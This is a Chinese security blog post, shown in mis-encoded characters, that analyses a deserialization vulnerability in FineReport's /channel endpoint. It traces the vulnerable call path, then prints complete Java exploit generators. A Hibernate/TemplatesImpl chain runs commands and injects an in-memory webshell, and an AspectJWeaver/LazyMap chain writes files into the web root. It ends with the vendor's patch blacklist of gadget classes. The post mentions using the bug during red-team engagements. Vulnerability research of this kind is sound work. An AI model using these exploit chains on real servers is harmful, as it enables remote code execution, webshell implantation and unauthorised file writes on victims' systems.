#  å¸†è½¯æŠ¥è¡¨ channel ååºåˆ—åŒ–æ¼æ´åˆ†æä¸åˆ©ç”¨   
æ³¾å¼¦å®‰å…¨  æ³¾å¼¦å®‰å…¨   2024-08-22 12:50  
  
**å›½å®¶åˆ©ç›ŠÂ é«˜äºä¸€åˆ‡**  
  
ğŸ”¥å¸ˆå‚…æ‚¨å¥½ï¼š  
ä¸ºäº†ç¡®ä¿æ‚¨ä¸é”™è¿‡æˆ‘ä»¬çš„æœ€æ–°ç½‘ç»œå®‰å…¨èµ„è®¯ã€æŠ€æœ¯åˆ†äº«å’Œå‰æ²¿åŠ¨æ€ï¼Œè¯·å°†æˆ‘ä»¬è®¾ä¸ºæ˜Ÿæ ‡ğŸŒŸï¼  
è¿™æ ·ï¼Œæ‚¨å°±èƒ½è½»æ¾è¿½è¸ªæˆ‘ä»¬çš„æ¯ä¸€ç¯‡ç²¾å½©å†…å®¹ï¼Œä¸æˆ‘ä»¬ä¸€èµ·å…±ç­‘ç½‘ç»œå®‰å…¨é˜²çº¿ï¼  
æ„Ÿè°¢æ‚¨çš„æ”¯æŒä¸å…³æ³¨ï¼  
ğŸ’ª  
  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/smiley_83b.png "")  
å…è´£å£°æ˜ï¼šæ–‡ç« æ‰€æ¶‰åŠå†…å®¹ï¼Œä»…ä¾›å®‰å…¨ç ”ç©¶æ•™å­¦ä½¿ç”¨ï¼Œç”±äºä¼ æ’­ã€åˆ©ç”¨æœ¬æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–é—´æ¥çš„åæœåŠæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œä½œè€…ä¸ä¸ºæ­¤æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚  
  
  
Â Â Â Â åœ¨è¿‘æœŸå¿™äºå¤„ç†hvvç›¸å…³äº‹åŠ¡ä¸­ï¼Œæˆ‘ä»¬å»¶è¿Ÿäº†å¯¹å…¬ä¼—å·åŠ¨æ€çš„æ›´æ–°ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸å¤§å®¶åˆ†äº«ä¸€ç¯‡å…³äºæŸè½¯çš„ååºåˆ—åŒ–æ¼æ´çš„æ·±å…¥åˆ†æã€‚æ­¤æ¼æ´åœ¨hwæ‰“ç‚¹çš„è¿‡ç¨‹ä¸­å¶å°”è¿˜ä¼šé‡åˆ°ï¼Œå› æ­¤åˆ†äº«ç»™å¤§å®¶ã€‚  
  
Â Â Â Â æœ¬æ–‡æˆ‘ä»¬å·²ç»åœ¨FreeBufå¹³å°å‘è¡¨è¿‡ä¸€æ¬¡ï¼Œç°åœ¨æˆ‘ä»¬å†³å®šåœ¨æˆ‘ä»¬çš„å…¬ä¼—å·ä¸Šå†æ¬¡è¿›è¡Œåˆ†äº«ï¼Œä»¥ä¾¿è®©æ›´å¤šçš„è¯»è€…äº†è§£å’Œé˜²èŒƒæ­¤ç±»æ¼æ´ã€‚å¦‚æ–‡ä¸­æœ‰ä»»ä½•ä¸å‡†ç¡®ä¹‹å¤„ï¼Œæ¬¢è¿å¤§å®¶æŒ‡æ­£ï¼Œæˆ‘ä»¬å°†ä¼šåŠæ—¶è¿›è¡Œä¿®æ”¹å’Œæ›´æ–°ï¼ŒåºŸè¯ä¸å¤šè¯´è®©æˆ‘ä»¬å¼€å§‹å§ï¼  
  
**0x01 æ¼æ´åˆ†æ**  
  
é€šè¿‡è®¿é—®æ¼æ´æ¥å£æŸ¥çœ‹åˆ°å¯¹åº”çš„å¤„ç†ç±»ï¼š  
com.fr.decision.extension.report.api.remote.RemoteDesignResource.onMessage  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8eFhW5PY6kOkEicqyk35QABOBtkjxDPhQDAGfp3oH6nWldfP1Ys0TpBQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a82AdKVf12Dkq9goEPUibeDhqDHcMjsR4jSGibtHXChzhZNb3ygWSDapqQ/640?wx_fmt=png&from=appmsg "")  
  
æœç´¢/channel"}Â ä¹Ÿå¯ä»¥æŸ¥åˆ°å¯¹åº”çš„ç±»  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a80R0wotQqgfQu2ARic7EcMt5l4mxWDicPaIO7Er7YpaQYaQ87yAUdNGFg/640?wx_fmt=png&from=appmsg "")  
  
å¯ä»¥çœ‹åˆ°Â onMessage æ˜¯å¯¹åº”çš„å¤„ç†æ–¹æ³•  
  
å¯ä»¥çœ‹åˆ°é¦–å…ˆå¯¹var1è¿›è¡Œäº†åŒ…è£…ï¼Œç„¶åå†ä½¿ç”¨WorkContext.handleMessageå¯¹å…¶è¿›è¡Œçš„å¤„ç†  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8mjy2auAwmVKWYRNKqhbiafQibPSFwcyCun2hjfBNmowbq0AHIVwr0s6Q/640?wx_fmt=png&from=appmsg "")  
  
è·Ÿè¿›WorkContext.handleMessageï¼Œå‘ç°ä½¿ç”¨äº†Â   
  
WorkspaceMessageHandlerä¸­çš„handleMessageæ–¹æ³•è¿›è¡Œäº†å¤„ç†  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8LyI6kDLxP84IeP6ZzWl2KKeKhSpo6RTKJwjn2Jvmv4pECl0pbcNmqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8NbRwKauGHTDr3o0zJ0gQMMBdSTz8RnQBvzL93XrUBsZ8YVg0obeoQg/640?wx_fmt=png&from=appmsg "")  
  
è·Ÿè¿›Â WorkspaceServerInvoker.java handleMessage æ–¹æ³•ä¸­  
  
å‘ç°åˆä½¿ç”¨Â deserializeInvocationæ–¹æ³•å¯¹æ•°æ®è¿›è¡Œå¤„ç†  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8gpCa2nkYe2YD29waTuDkQSWlnHTj2BiahyOrpXcPxNbpkUTTIM7F1MA/640?wx_fmt=png&from=appmsg "")  
  
è·Ÿè¿›deserializeInvocationÂ é¦–å…ˆçœ‹çœ‹GZipSerializerWrapper.wrapæ–¹æ³•ä¼šè¿”å›ä»€ä¹ˆ  
  
è¿”å›äº†ä¸€ä¸ªÂ GZipSerializerWrapper å¯¹è±¡  
  
å†çœ‹çœ‹InvocationSerializer.getDefault()è¿”å›äº†ä»€ä¹ˆ  
  
è¿”å›äº†ä¸€ä¸ªÂ InvocationSerializerå¯¹è±¡  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a86L8erDbbF0AhHt84CgKObg08SgpnqicCsAnJkicwpH24GnUMDiaJ7AcIQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8TrbNPopmI5OwH03RJuNjpUFwxsPNlsic0yalSfsdmlAKbbiboaYXQNicg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8O8AwibkCnUhAVDKXGbfAGSSuwPEBvxwsvib2je8LYj2ib7OsbxQKmCnFQ/640?wx_fmt=png&from=appmsg "")  
  
å†æ¥è·Ÿè¿›Â public static Object deserialize(byte[] var0, Serializer var1) æ–¹æ³•  
  
å¦‚æœvar1Â ä¸ä¸ºç©ºÂ é‚£ä¹ˆå°±ä½¿ç”¨var1çš„deserializeæ–¹æ³•å¤„ç†var2Â ä¹Ÿå°±æ˜¯ByteArrayInputStreamåŒ…è£…è¿‡çš„var0  
  
å‰é¢ä¹Ÿå¯ä»¥çŸ¥é“Â var1 æ˜¯ä¸€ä¸ªGZipSerializerWrapperå¯¹è±¡Â é‚£ä¹ˆå°±çœ‹è¿™ä¸ªå¯¹è±¡å¯¹åº”çš„Â deserializeæ–¹æ³•  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8cy3DwlJdlibzb0NernA6wgRqUtHdQ0KOAQGGAlwtjULlwqvvDK75OuA/640?wx_fmt=png&from=appmsg "")  
  
GZipSerializerWrapper.deserialize  
  
æŸ¥çœ‹ä¸‹this.serializerÂ æ˜¯ä»€ä¹ˆå¯¹è±¡Â   
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8eryZ6CtcqJXxegxzobttEmPKUxCPImDLNwx6YnubyqgpGjudsIaqpw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8wY1VDY5yWRHlTrMor8lD0vMXUFMibyWicyw23uMnZcCvPQYlYjL7TjJQ/640?wx_fmt=png&from=appmsg "")  
  
å› ä¸ºå½“æ—¶å‰é¢ä½¿ç”¨äº†warpÂ ç„¶åè¿”å›ä¸€ä¸ªÂ GZipSerializerWrapperçš„æœ‰å‚æ„é€ Â è€Œä¸”å‚æ•°ä¸ºInvocationSerializerå¯¹è±¡  
  
é‚£ä¹ˆthis.serializerÂ å°±æ˜¯InvocationSerializerå¯¹è±¡  
  
ç„¶åå°±ç»§ç»­è·Ÿå¦‚Â InvocationSerializerå¯¹è±¡çš„deserializeæ–¹æ³•  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8hUYdxW1jeGEfU11hhjJPejT1l5icUEpVbIibJyia6cHb5Lwd4UIfiaibOww/640?wx_fmt=png&from=appmsg "")  
  
InvocationSerializerå¯¹è±¡çš„deserializeæ–¹æ³•  
  
å¯ä»¥çœ‹åˆ°è§¦å‘äº†ä¸¤æ¬¡readObjectÂ é‚£ä¹ˆæµç¨‹å°±èµ°å®Œäº†ï¼Œå¼€å§‹å¯»æ‰¾é“¾  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a86bZGSk75nv2ibrzA6tm2KfWZEl7Yh6T04icLRFd8MgIvOvo43Q55Ubsg/640?wx_fmt=png&from=appmsg "")  
## 0X02 åˆ©ç”¨é“¾åˆ†æ  
### v10.0.10  
  
å› ä¸ºå¸†è½¯å¾ˆåƒshiroÂ ä¹Ÿæ˜¯å†…ç½®cbé“¾Â   
  
ç›®å‰æ€è·¯å°±æ˜¯shiroæ— ä¾èµ–åˆ©ç”¨é“¾Â JavaBean PropertyUtils.getProperty() è¿›è¡Œé“¾çš„æ„é€   
  
æ‰€ä»¥ç›®å‰å¾—å…ˆæ‰¾ä¸€ä¸ªÂ getter å¹¶ä¸”è¿™ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤  
  
ä½†æ˜¯è¿™æ—¶å€™æˆ‘å‘ç°Â åè½¯å†…ç½®çš„Â InvokerTransformer æ²¡æœ‰ç»§æ‰¿serializable  
  
è€ƒè™‘Â åç»­ç”¨jdkå†…ç½®è‡ªå¸¦çš„TemplatesImplç±»çš„getOutputPropertiesè¿›è¡Œ  
  
åç»­å‘ç°Â å†…ç½®ä¹Ÿæ²¡æœ‰æœ‰PropertyUtilsÂ ç±»  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8TbtNaNwuMQvoic4fG2iadgtakGgzTaRWKRWh72BdU5P3fMOicLA1yJbZA/640?wx_fmt=png&from=appmsg "")  
  
å› ä¸ºåè½¯å†…ç½®æ²¡æœ‰Â PropertyUtilsï¼Œä½†æ˜¯è€ƒè™‘ä¹Ÿæ˜¯ç”¨getterÂ è¿™ç§å»è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„Â é‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘å¦ä¸€ä¸ªé“¾Hibernate  
  
è¿™æ¡é“¾çš„å…·ä½“æ–‡ç« å¯ä»¥Â å‚è€ƒÂ Hibernate  
#### æ€è·¯ï¼š  
  
é€šè¿‡Hibernateç»“åˆTemplatesImplè¿™æ¡é“¾Â è§¦å‘getOutputPropertiesÂ æ–¹æ³•ä¸­çš„newTransformer()Â å»æ‰§è¡Œä»»æ„æ–¹æ³•çš„è°ƒç”¨  
#### Hibernateé“¾  
  
```

public class HibernateExp {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object createWithoutConstructor(Class aa) throws Exception{
        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
        Object o = reflectionFactory.newConstructorForSerialization(aa, Object.class.getDeclaredConstructor()).newInstance();
        return o;
    }
    public static void main(String[] args) throws Exception{
        Class<?> componentTypeClass = Class.forName("com.fr.third.org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer");

        //åŠ¨æ€åˆ›å»ºå­—èŠ‚ç 
        String cmd = "java.lang.Runtime.getRuntime().exec(\"ping -c 1 xxxx.dnslog.pw\");";
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "HibernateExp");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        Method getOutputProperties = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

        Object getter;
        try {
            // åˆ›å»º GetterMethodImpl å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ TemplatesImpl çš„ getOutputProperties æ–¹æ³•
            Class<?> getterImpl = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
            Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, getOutputProperties);
        }catch (Exception ignored){
            // åˆ›å»º BasicGetter å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ TemplatesImpl çš„ getOutputProperties æ–¹æ³•
            Class<?> basicGetter = Class.forName("com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(templates.getClass(), getOutputProperties, "outputProperties");
        }

        // åˆ›å»º PojoComponentTuplizer å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ Getter æ–¹æ³•
        Object tuplizer = createWithoutConstructor(pojoComponentTuplizerClass);

        // åå°„å°† BasicGetter å†™å…¥ PojoComponentTuplizer çš„æˆå‘˜å˜é‡ getters é‡Œ
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tuplizer, getters);

        // åˆ›å»º ComponentType å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ PojoComponentTuplizer çš„ getPropertyValues æ–¹æ³•
        Object type = createWithoutConstructor(componentTypeClass);

        // åå°„å°†ç›¸å…³å€¼å†™å…¥ï¼Œæ»¡è¶³ ComponentType çš„ getHashCode è°ƒç”¨æ‰€éœ€æ¡ä»¶
        Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
        field1.setAccessible(true);
        field1.set(type, tuplizer);

        Field field2 = componentTypeClass.getDeclaredField("propertySpan");
        field2.setAccessible(true);
        field2.set(type, 1);

        Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
        field3.setAccessible(true);
        field3.set(type, new Type[]{(Type) type});

        // åˆ›å»º TypedValue å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ ComponentType çš„ getHashCode æ–¹æ³•
        TypedValue typedValue = new TypedValue((Type) type, null);

        // åˆ›å»ºååºåˆ—åŒ–ç”¨ HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "aaa");

        // put åˆ° hashmap ä¹‹åå†åå°„å†™å…¥ï¼Œé˜²æ­¢ put æ—¶è§¦å‘
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, templates);

        byte[] serialize = Serializer.serialize(hashMap);
        String fileName = "ser.bin";
        FileOutputStream fos = new FileOutputStream(fileName);
        GZIPOutputStream gzip = new GZIPOutputStream(fos);
        gzip.write(serialize);
        gzip.finish();
        fos.close();
    }
}
```  
  
  
æ‰§è¡Œå‘½ä»¤æˆåŠŸå  
  
æ‰“å…¥å†…å­˜é©¬  
  
**EXP**  
```
public class HibernateExp {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object createWithoutConstructor(Class aa) throws Exception{
        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
        Object o = reflectionFactory.newConstructorForSerialization(aa, Object.class.getDeclaredConstructor()).newInstance();
        return o;
    }
    public static void main(String[] args) throws Exception{
        Class<?> componentTypeClass = Class.forName("com.fr.third.org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer");
        String memshell = "Base64ç¼–ç çš„å†…å­˜é©¬";
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        byte[] bytes = new BASE64Decoder().decodeBuffer(memshell);

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "HibernateExp");
//        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        Method getOutputProperties = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

        Object getter;
        try {
            // åˆ›å»º GetterMethodImpl å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ TemplatesImpl çš„ getOutputProperties æ–¹æ³•
            Class<?> getterImpl = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
            Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, getOutputProperties);
        }catch (Exception ignored){
            // åˆ›å»º BasicGetter å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ TemplatesImpl çš„ getOutputProperties æ–¹æ³•
            Class<?> basicGetter = Class.forName("com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(templates.getClass(), getOutputProperties, "outputProperties");
        }

        // åˆ›å»º PojoComponentTuplizer å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ Getter æ–¹æ³•
        Object tuplizer = createWithoutConstructor(pojoComponentTuplizerClass);

        // åå°„å°† BasicGetter å†™å…¥ PojoComponentTuplizer çš„æˆå‘˜å˜é‡ getters é‡Œ
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tuplizer, getters);

        // åˆ›å»º ComponentType å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ PojoComponentTuplizer çš„ getPropertyValues æ–¹æ³•
        Object type = createWithoutConstructor(componentTypeClass);

        // åå°„å°†ç›¸å…³å€¼å†™å…¥ï¼Œæ»¡è¶³ ComponentType çš„ getHashCode è°ƒç”¨æ‰€éœ€æ¡ä»¶
        Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
        field1.setAccessible(true);
        field1.set(type, tuplizer);

        Field field2 = componentTypeClass.getDeclaredField("propertySpan");
        field2.setAccessible(true);
        field2.set(type, 1);

        Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
        field3.setAccessible(true);
        field3.set(type, new Type[]{(Type) type});

        // åˆ›å»º TypedValue å®ä¾‹ï¼Œç”¨æ¥è§¦å‘ ComponentType çš„ getHashCode æ–¹æ³•
        TypedValue typedValue = new TypedValue((Type) type, null);

        // åˆ›å»ºååºåˆ—åŒ–ç”¨ HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "aaa");

        // put åˆ° hashmap ä¹‹åå†åå°„å†™å…¥ï¼Œé˜²æ­¢ put æ—¶è§¦å‘
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, templates);

        byte[] serialize = Serializer.serialize(hashMap);
        String fileName = "ser.bin";
        FileOutputStream fos = new FileOutputStream(fileName);
        GZIPOutputStream gzip = new GZIPOutputStream(fos);
        gzip.write(serialize);
        gzip.finish();
        fos.close();
    }
}

```  
  
å†™æ–‡ä»¶EXP-AspectJWeaverååºåˆ—åŒ–åˆ©ç”¨é“¾  
  
AspectJWeaverååºåˆ—åŒ–åˆ©ç”¨é“¾  
  
é€šè¿‡æŸ¥è¯¢å‘ç°å­˜åœ¨ SimpleCache.java å¹¶ä¸”å†…éƒ¨ç±»StoreableCachingMapæ˜¯ä¸€ä¸ªç»§æ‰¿HashMapçš„ç±» é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨æ­¤é“¾![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtT7UibTTzJMAYJSVZP1qawpy3oBQFlL9C01v0V9hYF0Guic0HGSQ193ZJg/640?wx_fmt=png&from=appmsg "")  
  
  
å‘ç°ä¹Ÿå­˜åœ¨å†…ç½®çš„ collections4 é‚£ä¹ˆå°±å¯ä»¥ç”¨LazyMap å°†å…¶ä¸²èµ·æ¥  
  
è¿™é‡Œç›´æ¥å¯¹ysoçš„expè¿›è¡Œæ›´æ”¹  
```
public class AspectJWeaverEXP {
    public static void main(String[] args) throws Exception {
        String filename ="test9527.txt";
        byte[] content = new BASE64Decoder().decodeBuffer("dGVzdDk1Mjc=");

        // ä½¿ç”¨åå°„è·å–ç±»çš„æ„é€ å‡½æ•°
        Class ctor = Class.forName("com.fr.third.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor declaredConstructor = ctor.getDeclaredConstructor(String.class,int.class);
        declaredConstructor.setAccessible(true);
        // å®ä¾‹åŒ–ç±»å¯¹è±¡
        Object simpleCache = declaredConstructor.newInstance(".", 12);

        // åˆ›å»ºå¸¸é‡è½¬æ¢å™¨ï¼Œç”¨äºå°†å†…å®¹è½¬æ¢ä¸ºå¸¸é‡
        Transformer ct = new ConstantTransformer(content);
        // åˆ›å»ºæ‡’åŠ è½½Mapï¼Œå¹¶å°†è½¬æ¢å™¨åº”ç”¨äºè¯¥Map
        Map lazyMap = LazyMap.lazyMap((Map) simpleCache, ct);

        // åˆ›å»ºTiedMapEntryå¯¹è±¡ï¼Œå°†æ‡’åŠ è½½Mapå’Œæ–‡ä»¶åç»‘å®šåœ¨ä¸€èµ·
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        // åˆ›å»ºHashSetå¯¹è±¡ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªå…ƒç´ 
        HashSet map = new HashSet(1);
        map.add("foo");

        // ä½¿ç”¨åå°„è·å–HashSetå¯¹è±¡çš„mapå­—æ®µï¼ˆæˆ–backingMapå­—æ®µï¼‰
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        // ä½¿ç”¨åå°„è·å–HashMapå¯¹è±¡çš„tableå­—æ®µï¼ˆæˆ–elementDataå­—æ®µï¼‰
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        // è·å–æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªéç©ºèŠ‚ç‚¹
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        // ä½¿ç”¨åå°„è®¾ç½®èŠ‚ç‚¹çš„keyå­—æ®µä¸ºTiedMapEntryå¯¹è±¡
        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, entry);

        // è¿”å›HashSetå¯¹è±¡
        byte[] serialize = Serializer.serialize(map);
        String fileName = "ser2.bin";
        FileOutputStream fos = new FileOutputStream(fileName);
        GZIPOutputStream gzip = new GZIPOutputStream(fos);
        gzip.write(serialize);
        gzip.finish();
        fos.close();
    }
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtTKDesR0Ivjah9Ypq1Lo0flZU4eJZPN1g3qFpMPRKn6arN2qLgu04liaw/640?wx_fmt=png&from=appmsg "")  
  
å†™å…¥webç›®å½•åªéœ€è¦å°†filenameæ”¹ä¸º  
```
String filename ="/webapps/webroot/test9527.txt";
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtTKzpLd5pT1T6VNhcMI2diavD0xT15XsCJEBr5xmLp5A6xF18W6wy5syw/640?wx_fmt=png&from=appmsg "")  
### v10.0.15  
  
é‡æ–°è·Ÿä¸‹æ¼æ´è§¦å‘ç‚¹  
  
å‘ç°åœ¨æ¼æ´è§¦å‘ç‚¹å‰ InvocationSerializer.class ä¸­çš„ deserialize å¯¹ è¾“å…¥æµåˆè¿›è¡Œäº†CustomObjectInputStreamå¤„ç†  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtTzAxgKIHycXSpt6Pp16ckLqtpChtZxFrS9WakrGyUiad8Ywic9J9snw1Q/640?wx_fmt=png&from=appmsg "")  
  
è·Ÿè¿› CustomObjectInputStreamï¼Œå‘ç°å¯¹ä¹‹å‰çš„æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œä¿®å¤æ–¹æ¡ˆå°±æ˜¯å°†ååºåˆ—åŒ–çš„ç±»åŠ å…¥çš„é»‘åå•  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtTxYUkzsaB1Lo5GETdtbOQsMxJfuAj1jlwjtWrbaaoniapmNIvGlKPvdg/640?wx_fmt=png&from=appmsg "")  
  
é»‘åå•  
```
bsh.XThis
bsh.Interpreter
com.mchange.v2.c3p0.PoolBackedDataSource
com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase
clojure.lang.PersistentArrayMap
clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a
org.apache.commons.beanutils.BeanComparator
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors.ChainedTransformer
org.apache.commons.collections.functors.ConstantTransformer
org.apache.commons.collections.functors.InstantiateTransformer
org.apache.commons.collections.map.LazyMap
org.apache.commons.collections.functors.InvokerTransformer
org.apache.commons.collections.keyvalue.TiedMapEntry
com.fr.third.org.apache.commons.collections4.comparators.TransformingComparator
com.fr.third.org.apache.commons.collections4.functors.InvokerTransformer
com.fr.third.org.apache.commons.collections4.functors.ChainedTransformer
com.fr.third.org.apache.commons.collections4.functors.ConstantTransformer
com.fr.third.org.apache.commons.collections4.functors.InstantiateTransformer
com.fr.third.org.apache.commons.fileupload.disk.DiskFileItem
com.fr.third.org.apache.commons.io.output.DeferredFileOutputStream
com.fr.third.org.apache.commons.io.output.ThresholdingOutputStream
org.apache.wicket.util.upload.DiskFileItem
org.apache.wicket.util.io.DeferredFileOutputStream
org.apache.wicket.util.io.ThresholdingOutputStream
org.codehaus.groovy.runtime.ConvertedClosure
org.codehaus.groovy.runtime.MethodClosure
com.fr.third.org.hibernate.engine.spi.TypedValue
com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer
com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer
com.fr.third.org.hibernate.type.AbstractType
com.fr.third.org.hibernate.type.ComponentType
com.fr.third.org.hibernate.type.Type
com.fr.third.org.hibernate.EntityMode
com.sun.rowset.JdbcRowSetImpl
org.jboss.interceptor.builder.InterceptionModelBuilder
org.jboss.interceptor.builder.MethodReference
org.jboss.interceptor.proxy.DefaultInvocationContextFactory
org.jboss.interceptor.proxy.InterceptorMethodHandler
org.jboss.interceptor.reader.ClassMetadataInterceptorReference
org.jboss.interceptor.reader.DefaultMethodMetadata
org.jboss.interceptor.reader.ReflectiveClassMetadata
